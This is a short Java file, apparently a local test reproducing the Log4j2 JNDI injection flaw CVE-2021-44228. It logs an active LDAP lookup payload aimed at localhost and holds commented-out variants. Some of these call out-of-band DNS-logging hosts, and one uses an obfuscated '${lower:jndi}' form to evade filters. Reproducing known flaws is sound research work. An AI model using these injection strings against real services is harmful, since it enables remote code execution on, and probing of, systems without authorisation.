package com.r17a.log4j2.cve_2021_44228;


import org.apache.log4j.PropertyConfigurator;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class RCE_20211209 {
    public static final Logger LOGGER = LogManager.getLogger(RCE_20211209.class);
    public static void main(String[] args) {
        PropertyConfigurator.configure( "./log4j/src/main/resources/log4j.properties" );
        System.out.println("test for log4j2");
        LOGGER.error("${jndi:ldap://localhost:1389/cn=foo,dc=example,dc=com}");
//        LOGGER.error("${jndi:ldap://localhost:1389/exp}");
//        LOGGER.error("${jndi:ldap://127.0.0.1:1389/tpw9nj}");
//        LOGGER.error("${jndi:rmi://pb8397.dnslog.cn/123}");
//        LOGGER.error("${${lower:jndi}:${lower:rmi}://2.test.0ks3b9.ceye.io/poc} ");
    }
}
